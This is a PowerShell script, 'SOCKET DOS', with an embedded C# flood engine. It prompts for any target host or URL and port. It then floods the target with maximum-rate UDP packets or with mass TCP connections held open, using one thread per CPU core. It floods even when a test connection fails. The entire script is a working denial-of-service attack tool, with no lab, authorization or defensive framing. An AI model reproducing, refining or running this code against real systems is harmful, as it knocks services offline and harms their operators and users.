Clear-Host

$Host.UI.RawUI.WindowTitle = "SOCKET DOS"

$worker_count = [Environment]::ProcessorCount
$udp_packet_size_bytes = 1472

$protocol = ""
while ($protocol -ne "TCP" -and $protocol -ne "UDP") {
    $answer = Read-Host -Prompt "Protocol - (T)CP or (U)DP?"
    if ($answer -match '^(T|TCP)$') { $protocol = "TCP" }
    if ($answer -match '^(U|UDP)$') { $protocol = "UDP" }
}

# accept a bare host, host:port, or a full URL; scheme sets the default port
$target_answer = Read-Host -Prompt "Target host or URL (example.com, https://example.com, 10.0.0.1:8080)"
$port_hint = 0
if ($target_answer -match '^(?<scheme>https?)://') {
    if ($Matches['scheme'] -eq 'https') { $port_hint = 443 } else { $port_hint = 80 }
    $target_answer = $target_answer -replace '^[a-zA-Z]+://', ''
    $target_answer = ($target_answer -split '/')[0]
}
if ($target_answer -match '^\[(?<ipv6>[^\]]+)\](:(?<port>\d+))?$') {
    $host_address = $Matches['ipv6']
    if ($Matches['port']) { $port_hint = [int]$Matches['port'] }
} elseif ($target_answer -match '^(?<host>[^:]+):(?<port>\d+)$') {
    $host_address = $Matches['host']
    $port_hint = [int]$Matches['port']
} else {
    $host_address = $target_answer
}
if ([string]::IsNullOrWhiteSpace($host_address)) {
    $host_address = Read-Host -Prompt "Target host"
}

$port_number = 0
while ($port_number -lt 1 -or $port_number -gt 65535) {
    $prompt_text = if ($port_hint) { "Target port (Enter = $port_hint)" } else { "Target port (1-65535)" }
    $answer = Read-Host -Prompt $prompt_text
    if ($answer -eq "" -and $port_hint) { $port_number = $port_hint }
    if ($answer -match '^\d+$') { $port_number = [int]$answer }
}

Write-Host "-------------------------------- SOCKET DOS $protocol --------------------------------" -ForegroundColor Yellow

try {
    $target_addresses = [System.Net.Dns]::GetHostAddresses($host_address)
} catch {
    Write-Host "Cannot resolve '$host_address' - nothing will reach the target. Check the host name or URL." -ForegroundColor Red
    return
}
$target_ip_address = $target_addresses | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -First 1
if (-not $target_ip_address) { $target_ip_address = $target_addresses | Select-Object -First 1 }
Write-Host "Resolved $host_address -> $target_ip_address" -ForegroundColor Cyan

if ($protocol -eq "TCP") {
    $test_client = New-Object System.Net.Sockets.TcpClient
    try {
        $test_client.Connect($target_ip_address, $port_number)
        Write-Host "Test connection succeeded" -ForegroundColor Green
        $test_client.Close()
    } catch {
        Write-Host "Test connection failed: $($_.Exception.Message) - flooding anyway" -ForegroundColor DarkYellow
    }
}

# compiled flood engine so the send loop is not throttled by the PowerShell interpreter
$flood_source = @"
using System;
using System.Collections.Concurrent;
using System.Net;
using System.Net.Sockets;
using System.Threading;

public static class SocketFlood
{
    public static volatile bool StopRequested;
    public static long UdpPacketsSent;
    public static long UdpSendFailures;
    public static string UdpLastErrorMessage;
    public static long TcpConnectionsHeld;
    public static long TcpConnectFailures;
    public static string TcpLastErrorMessage;
    private static readonly ConcurrentBag<TcpClient> HeldClients = new ConcurrentBag<TcpClient>();

    public static void FloodUdp(IPAddress target, int port, int packetSizeBytes, int workerCount)
    {
        var payload = new byte[packetSizeBytes];
        for (var workerNumber = 0; workerNumber < workerCount; workerNumber++)
        {
            var worker = new Thread(delegate()
            {
                // SIO_UDP_CONNRESET: do not surface ICMP port unreachable as Send failures
                const int SIO_UDP_CONNRESET = -1744830452;
                var sender = new UdpClient();
                try
                {
                    sender.Client.IOControl(SIO_UDP_CONNRESET, new byte[] { 0 }, null);
                }
                catch (SocketException)
                {
                    // not every platform supports the ioctl; sends may then throw on unreachable ports
                }
                sender.Connect(target, port);
                sender.Client.SendTimeout = 500;
                while (!StopRequested)
                {
                    try
                    {
                        sender.Send(payload, payload.Length);
                        Interlocked.Increment(ref UdpPacketsSent);
                    }
                    catch (SocketException error)
                    {
                        Interlocked.Increment(ref UdpSendFailures);
                        UdpLastErrorMessage = error.Message;
                    }
                }
                sender.Close();
            });
            worker.IsBackground = true;
            worker.Start();
        }
    }

    public static void FloodTcp(IPAddress target, int port, int workerCount)
    {
        for (var workerNumber = 0; workerNumber < workerCount; workerNumber++)
        {
            var worker = new Thread(delegate()
            {
                while (!StopRequested)
                {
                    var client = new TcpClient();
                    try
                    {
                        client.Connect(target, port);
                        HeldClients.Add(client);
                        Interlocked.Increment(ref TcpConnectionsHeld);
                    }
                    catch (Exception error)
                    {
                        Interlocked.Increment(ref TcpConnectFailures);
                        TcpLastErrorMessage = error.Message;
                        client.Close();
                        Thread.Sleep(20);
                    }
                }
            });
            worker.IsBackground = true;
            worker.Start();
        }
    }

    public static void ReleaseTcpConnections()
    {
        TcpClient releasedClient = null;
        while (HeldClients.TryTake(out releasedClient))
        {
            releasedClient.Close();
        }
    }
}
"@
try {
    Add-Type -TypeDefinition $flood_source -Language CSharp
} catch {
    Write-Host "Compiler failed once ($($_.Exception.Message)); retrying..." -ForegroundColor DarkYellow
    Start-Sleep -Seconds 1
    try {
        Add-Type -TypeDefinition $flood_source -Language CSharp
    } catch {
        Write-Host "Compiler failed twice - the machine may be too low on memory to compile the flood engine" -ForegroundColor Red
        return
    }
}

if ($protocol -eq "TCP") {
    Write-Host "Flooding $host_address`:$port_number with TCP connections from $worker_count parallel workers (Ctrl+C to stop and release)..." -ForegroundColor Yellow
    [SocketFlood]::FloodTcp($target_ip_address, $port_number, $worker_count)
    try {
        while ($true) {
            Start-Sleep -Seconds 1
            Write-Host ("Held open: {0:N0} connections" -f [SocketFlood]::TcpConnectionsHeld)
            if ([SocketFlood]::TcpConnectFailures -gt 0) {
                Write-Host ("Connect failures: {0:N0} - last error: {1}" -f [SocketFlood]::TcpConnectFailures, [SocketFlood]::TcpLastErrorMessage) -ForegroundColor DarkYellow
            }
        }
    } finally {
        [SocketFlood]::StopRequested = $true
        Start-Sleep -Milliseconds 300
        [SocketFlood]::ReleaseTcpConnections()
        Write-Host "Connections released" -ForegroundColor Yellow
    }
} else {
    Write-Host "Flooding $host_address`:$port_number with UDP packets from $worker_count parallel workers (Ctrl+C to stop)..." -ForegroundColor Yellow
    [SocketFlood]::FloodUdp($target_ip_address, $port_number, $udp_packet_size_bytes, $worker_count)
    try {
        while ($true) {
            Start-Sleep -Seconds 1
            Write-Host ("Sent: {0:N0} packets" -f [SocketFlood]::UdpPacketsSent)
            if ([SocketFlood]::UdpSendFailures -gt 0) {
                Write-Host ("Send failures: {0:N0} - last error: {1}" -f [SocketFlood]::UdpSendFailures, [SocketFlood]::UdpLastErrorMessage) -ForegroundColor DarkYellow
            }
        }
    } finally {
        [SocketFlood]::StopRequested = $true
    }
}
